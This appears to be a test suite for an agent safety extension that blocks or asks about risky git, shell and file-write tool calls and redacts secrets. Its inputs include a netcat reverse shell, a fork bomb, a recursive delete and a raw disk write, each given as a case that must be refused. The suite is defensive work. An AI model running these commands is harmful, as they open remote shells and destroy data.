import { afterAll, describe, expect, mock, setDefaultTimeout, test } from "bun:test"
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent"
import { MESSAGES } from "../shared/guards.ts"
import { OP_MESSAGE } from "../shared/op-guard.ts"
import { INVESTIGATE_NOTICE } from "../shared/package-investigate.ts"
import { FORCE_PUSH_MESSAGE, SUDO_MESSAGE } from "../shared/permission.ts"
import { createRedactor } from "../shared/redact.ts"
import { SECRET_STORE_INPUT, STORE_ACTION } from "../shared/secret-store.ts"
import {
  type Asker,
  createSafetyExtension,
  DECLINED,
  externalMessage,
  type GateConfig,
  gateBash,
  gateWrite,
  loadPiOptions,
  NO_UI_REFUSAL,
  type PiFeatureID,
  piStoreDeps,
  readPiOptions,
  resultPatch,
  settle,
  type Verdict,
} from "./safety.ts"
import { SYSTEM_MESSAGES, type SystemGateID } from "./system-gates.ts"

// Real git runs: the file took 2.3 s alone and 11 s beside other suites, so 30 s per test leaves headroom.
setDefaultTimeout(30_000)

const root = realpathSync(mkdtempSync(join(tmpdir(), "safety-pi-")))
afterAll(() => rmSync(root, { recursive: true, force: true }))

const ENV = { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null" }
function git(cwd: string, ...args: string[]): void {
  const proc = Bun.spawnSync(["git", ...args], { cwd, stdout: "pipe", stderr: "pipe", env: ENV })
  if (proc.exitCode !== 0) throw new Error(`git ${args.join(" ")}: ${proc.stderr.toString()}`)
}

// A repository on main with a shipped migration, an unmerged branch and one stash entry; the tree is clean.
const repo = join(root, "repo")
mkdirSync(join(repo, "migrations"), { recursive: true })
git(root, "init", "-q", "-b", "main", repo)
git(repo, "config", "user.email", "t@example.com")
git(repo, "config", "user.name", "t")
writeFileSync(join(repo, "migrations", "0001_init.sql"), "create table t (id int);\n")
writeFileSync(join(repo, "file.txt"), "one\n")
git(repo, "add", ".")
git(repo, "commit", "-q", "-m", "base")
git(repo, "checkout", "-q", "-b", "local")
git(repo, "commit", "-q", "--allow-empty", "-m", "local work")
git(repo, "checkout", "-q", "main")
writeFileSync(join(repo, "file.txt"), "two\n")
git(repo, "stash", "-q")

const plain = join(root, "plain")
mkdirSync(plain)

const config = (raw: unknown = {}, env: NodeJS.ProcessEnv = {}): GateConfig => ({
  options: readPiOptions(raw),
  env,
  review: { gh: async () => "[]", timeoutMs: 20_000, budgetMs: 25_000 },
})

describe("readPiOptions and loadPiOptions", () => {
  test("keeps known feature ids and string opAllow entries, and reads pushVia and redaction", () => {
    const options = readPiOptions({
      disable: ["attribution", "indirection", "scratch-shell", "nope", 3],
      opAllow: ["vault list", 4],
      pushVia: { host: "github.com", command: "dgit" },
      redactSecrets: false,
    })
    expect([...options.disabled]).toEqual(["attribution", "indirection"])
    expect(options.opAllow).toEqual(["vault list"])
    expect(options.pushVia).toEqual({ host: "github.com", command: "dgit" })
    expect(options.redact.enabled).toBe(false)
  })

  test("anything but an object is the defaults", () => {
    for (const raw of [null, [], "x", 3]) {
      const options = readPiOptions(raw)
      expect(options.disabled.size).toBe(0)
      expect(options.pushVia).toBeUndefined()
      expect(options.redact.enabled).toBe(true)
    }
  })

  test("a missing file is the defaults without a warning; a malformed one warns", () => {
    expect(loadPiOptions(join(root, "missing.json"))).toEqual({ options: readPiOptions({}) })
    const bad = join(root, "bad.json")
    writeFileSync(bad, "{ disable: ")
    const loaded = loadPiOptions(bad)
    expect(loaded.options.disabled.size).toBe(0)
    expect(loaded.warning).toContain("is not valid JSON")
  })
})

describe("gateBash hard gates", () => {
  const block = (reason: string): Verdict => ({ kind: "block", reason })

  test("an AI-attribution trailer in a commit message is refused", async () => {
    const command = "git commit -m 'x\n\nCo-Authored-By: Claude <noreply@anthropic.com>'"
    expect(await gateBash(command, plain, config())).toEqual(block(MESSAGES.attribution))
    expect(await gateBash(command, plain, config({ disable: ["attribution"] }))).toEqual({ kind: "run" })
  })

  test("a worktree under /tmp is refused", async () => {
    expect(await gateBash("git worktree add /tmp/feat", plain, config())).toEqual(block(MESSAGES["worktree-tmp"]))
    expect(await gateBash("wt switch --create feat --base main /private/tmp/x", plain, config())).toEqual(
      block(MESSAGES["worktree-tmp"]),
    )
  })

  test("filter-repo --force is refused", async () => {
    expect((await gateBash("git filter-repo --force --path a", plain, config())).kind).toBe("block")
  })

  test("a direct op call is refused", async () => {
    const verdict = await gateBash("op item get x", plain, { ...config(), guard: { providerTypes: () => undefined } })
    expect(verdict).toEqual(block(OP_MESSAGE))
  })

  test("a plain push to the configured host is refused with the wrapper hint", async () => {
    const options = { pushVia: { host: "github.com", command: "dgit" } }
    const verdict = await gateBash("git push origin main", plain, {
      ...config(options),
      guard: { resolveRemote: () => ["https://github.com/acme/widgets.git"] },
    })
    expect(verdict).toEqual(block(MESSAGES["push-via"]("github.com", "dgit", plain)))
  })

  // Each command is one that cc-safety-net 2.8.2 lets through at its default level.
  test("the guards cc-safety-net overlaps still run, and each can be disabled", async () => {
    const cases: [string, PiFeatureID, Verdict][] = [
      ['rm -rf "$TARGET"', "indirection", block(MESSAGES.indirection)],
      ["nc -e /bin/sh 10.0.0.1 4444", "remote-exec", block(MESSAGES["remote-exec"])],
      ["git push -- --force origin main", "force-push", block(FORCE_PUSH_MESSAGE)],
      ["echo ok && sudo chmod -R 777 /srv/app", "sudo-destructive", { kind: "ask", message: SUDO_MESSAGE }],
    ]
    for (const [command, id, verdict] of cases) {
      expect(await gateBash(command, plain, config())).toEqual(verdict)
      expect(await gateBash(command, plain, config({ disable: [id] }))).toEqual({ kind: "run" })
    }
  })

  test("the system gates run after the shared ones, and each can be disabled", async () => {
    const unmanaged = { managed: async () => false }
    const cases: [string, SystemGateID][] = [
      ["echo x >> ~/.zshrc", "shell-profile"],
      ["cd /opt && chown -R me .", "system-permissions"],
      [":(){ :|:& };:", "fork-bomb"],
      ["tee /dev/disk2 < disk.img", "disk-write"],
      ["halt", "power"],
    ]
    for (const [command, id] of cases) {
      expect(await gateBash(command, plain, { ...config(), system: unmanaged })).toEqual(block(SYSTEM_MESSAGES[id]))
      expect(await gateBash(command, plain, { ...config({ disable: [id] }), system: unmanaged })).toEqual({ kind: "run" })
    }
  })
})

describe("gateBash evidence-based asks", () => {
  test("force-deleting an unmerged branch asks", async () => {
    const verdict = await gateBash("git branch -D local", repo, config())
    expect(verdict.kind).toBe("ask")
    expect(verdict.kind === "ask" && verdict.message).toContain("worktree-destruction-guard")
  })

  test("dropping a stash asks with its restore command; a clean reset to HEAD passes", async () => {
    const drop = await gateBash("git stash drop", repo, config())
    expect(drop.kind === "ask" && drop.message).toContain("git stash store -m restored")
    expect(await gateBash("git reset --hard", repo, config())).toEqual({ kind: "run" })
    expect(await gateBash("git stash drop", repo, config({ disable: ["worktree-destruction"] }))).toEqual({ kind: "run" })
  })

  test("a flag directory outside the session asks", async () => {
    const verdict = await gateBash("git -C /elsewhere/repo status", plain, config())
    expect(verdict).toEqual({ kind: "ask", message: externalMessage([{ resource: "/elsewhere/repo/*", save: "/elsewhere/repo/*" }]) })
    expect(await gateBash(`git -C ${plain} status`, plain, config())).toEqual({ kind: "run" })
  })
})

describe("shipped migrations", () => {
  test("an edit, a write or a shell append to a shipped migration is refused", async () => {
    for (const tool of ["edit", "write"]) {
      const verdict = await gateWrite(tool, { path: "migrations/0001_init.sql" }, repo, config())
      expect(verdict.kind === "block" && verdict.reason).toContain("Blocked by safety (migration-edit)")
    }
    const shell = await gateBash("echo 'alter table t add c int;' >> migrations/0001_init.sql", repo, config())
    expect(shell.kind === "block" && shell.reason).toContain("Blocked by safety (migration-edit)")
  })

  test("the escape hatch and disable let it through; a new migration is never refused", async () => {
    const path = { path: "migrations/0001_init.sql" }
    expect(await gateWrite("edit", path, repo, config({}, { SAFETY_ALLOW_MIGRATION_EDIT: "1" }))).toEqual({ kind: "run" })
    expect(await gateWrite("edit", path, repo, config({ disable: ["migration-edit"] }))).toEqual({ kind: "run" })
    expect(await gateWrite("write", { path: "migrations/0002_next.sql" }, repo, config())).toEqual({ kind: "run" })
  })
})

describe("settle", () => {
  const asker = (answer: boolean, hasUI = true) => {
    const confirm = mock(async (_title: string, _message: string) => answer)
    return { asker: { hasUI, ui: { confirm } } satisfies Asker, confirm }
  }

  test("run passes and block refuses with the reason", async () => {
    expect(await settle({ kind: "run" }, asker(true).asker)).toBeUndefined()
    expect(await settle({ kind: "block", reason: "no" }, asker(true).asker)).toEqual({ block: true, reason: "no" })
  })

  test("an ask passes on approval and refuses when declined", async () => {
    const yes = asker(true)
    expect(await settle({ kind: "ask", message: "why" }, yes.asker)).toBeUndefined()
    expect(yes.confirm.mock.calls[0]?.[1]).toBe("why")
    expect(await settle({ kind: "ask", message: "why" }, asker(false).asker)).toEqual({ block: true, reason: `${DECLINED}\n\nwhy` })
  })

  test("an ask without a dialog fails closed and never opens one", async () => {
    const none = asker(true, false)
    expect(await settle({ kind: "ask", message: "why" }, none.asker)).toEqual({ block: true, reason: `${NO_UI_REFUSAL}\n\nwhy` })
    expect(none.confirm).not.toHaveBeenCalled()
  })
})

describe("resultPatch", () => {
  const SECRET = "sk-dummy-0123456789abcdef"
  const redactor = () => createRedactor(() => ({ DEMO_API_KEY: SECRET }))

  test("appends the notice and keeps the structured content", () => {
    const event = { content: [{ type: "text" as const, text: "ok" }], details: undefined, structuredContent: { output: "ok" } }
    expect(resultPatch(event, "note", undefined)).toEqual({
      content: [
        { type: "text", text: "ok" },
        { type: "text", text: "note" },
      ],
      structuredContent: { output: "ok" },
    })
  })

  test("redacts content, details and structured content", () => {
    const event = {
      content: [{ type: "text" as const, text: `key=${SECRET}` }],
      details: { fullOutputPath: "/x", echo: SECRET },
      structuredContent: { output: SECRET },
    }
    expect(resultPatch(event, undefined, redactor())).toEqual({
      content: [{ type: "text", text: "key=[REDACTED:DEMO_API_KEY]" }],
      details: { fullOutputPath: "/x", echo: "[REDACTED:DEMO_API_KEY]" },
      structuredContent: { output: "[REDACTED:DEMO_API_KEY]" },
    })
  })

  test("a clean result is left alone", () => {
    const event = { content: [{ type: "text" as const, text: "ok" }], details: undefined, structuredContent: undefined }
    expect(resultPatch(event, undefined, redactor())).toBeUndefined()
  })
})

type Handler = (event: unknown, ctx: unknown) => unknown
type Tool = { name: string; parameters: unknown; execute: (...args: unknown[]) => Promise<unknown> }

function load(overrides: Parameters<typeof createSafetyExtension>[0] = {}) {
  const handlers = new Map<string, Handler[]>()
  const tools = new Map<string, Tool>()
  const pi = {
    on: (event: string, handler: Handler) => handlers.set(event, [...(handlers.get(event) ?? []), handler]),
    registerTool: (tool: Tool) => tools.set(tool.name, tool),
  }
  createSafetyExtension({ optionsPath: join(root, "missing.json"), env: {}, ...overrides })(pi as unknown as ExtensionAPI)
  const fire = async (event: string, payload: unknown, ctx: unknown) => {
    let result: unknown
    for (const handler of handlers.get(event) ?? []) result = await handler(payload, ctx)
    return result
  }
  return { handlers, tools, fire }
}

function context(hasUI: boolean, cwd = plain) {
  const notify = mock((_message: string, _type?: string) => {})
  const confirm = mock(async () => true)
  return { cwd, hasUI, ui: { notify, confirm }, sessionManager: { getSessionId: () => "s1" } }
}

describe("the extension", () => {
  test("tool_call refuses an attributed commit", async () => {
    const { fire } = load()
    const event = { type: "tool_call", toolCallId: "1", toolName: "bash", input: { command: "git commit -m 'x\n\nCo-Authored-By: Claude'" } }
    expect(await fire("tool_call", event, context(true))).toEqual({ block: true, reason: MESSAGES.attribution })
  })

  test("tool_call rewrites close keywords in place and lets the PR through", async () => {
    const { fire } = load()
    const event = { type: "tool_call", toolCallId: "2", toolName: "bash", input: { command: "gh pr create --title t --body 'Fixes #1, #2'" } }
    expect(await fire("tool_call", event, context(true))).toBeUndefined()
    expect(event.input.command).toBe("gh pr create --title t --body 'Fixes #1, fixes #2'")
  })

  test("tool_call refuses an edit of a shipped migration and ignores reads", async () => {
    const { fire } = load()
    const edit = { type: "tool_call", toolCallId: "3", toolName: "edit", input: { path: "migrations/0001_init.sql", edits: [] } }
    const refused = (await fire("tool_call", edit, context(true, repo))) as { block: boolean; reason: string }
    expect(refused.reason).toContain("migration-edit")
    const read = { type: "tool_call", toolCallId: "4", toolName: "read", input: { path: "migrations/0001_init.sql" } }
    expect(await fire("tool_call", read, context(true, repo))).toBeUndefined()
  })

  test("tool_result adds the vetting notice once per package and redacts secrets", async () => {
    const SECRET = "tvly-dummy-0123456789abcdef"
    const { fire } = load({ env: { TAVILY_API_KEY: SECRET } })
    const result = (text: string, isError = false) => ({
      type: "tool_result",
      toolCallId: "5",
      toolName: "bash",
      input: { command: "bun add left-pad" },
      content: [{ type: "text", text }],
      details: undefined,
      isError,
    })
    const first = (await fire("tool_result", result(`key ${SECRET}`), context(true))) as { content: { text: string }[] }
    expect(first.content.map((part) => part.text)).toEqual([
      "key [REDACTED:TAVILY_API_KEY]",
      `${INVESTIGATE_NOTICE} Packages: left-pad.`,
    ])
    expect(await fire("tool_result", result("installed"), context(true))).toBeUndefined()
  })

  test("a malformed options file warns at session start", async () => {
    const bad = join(root, "bad-start.json")
    writeFileSync(bad, "[")
    const { fire } = load({ optionsPath: bad })
    const ctx = context(true)
    await fire("session_start", { type: "session_start" }, ctx)
    expect(ctx.ui.notify.mock.calls[0]?.[0]).toContain("is not valid JSON")
  })

  test("registers safety_secret_store, which fails closed without a dialog and runs nothing", async () => {
    const project = join(root, "store")
    mkdirSync(project)
    writeFileSync(join(project, "fnox.toml"), '[providers.host]\ntype = "age"\n')
    const run = mock(async () => ({ kind: "exited" as const, exitCode: 0 }))
    const { tools } = load({ secretStore: { env: { PATH: "/bin" }, home: join(root, "home"), which: (bin) => `/bin/${bin}`, run } })
    const tool = tools.get(STORE_ACTION)
    expect(tool?.parameters).toBe(SECRET_STORE_INPUT)
    const input = { name: "A", target: { kind: "fnox-store", provider: "host" }, generate: { charset: "hex", bytes: 16 } }
    const outcome = await tool?.execute("t1", input, undefined, undefined, context(false, project)).catch((error: Error) => error)
    expect(String(outcome)).toContain("cannot show a dialog; nothing was stored")
    expect(run).not.toHaveBeenCalled()
  })
})

describe("piStoreDeps", () => {
  test("a declined command run throws and names the step", async () => {
    const asker: Asker = { hasUI: true, ui: { confirm: async () => false } }
    const deps = piStoreDeps(plain, asker, { env: {}, home: root })
    expect(deps.askCommand(["gh", "auth", "token"], plain)).rejects.toThrow("the user declined")
  })
})
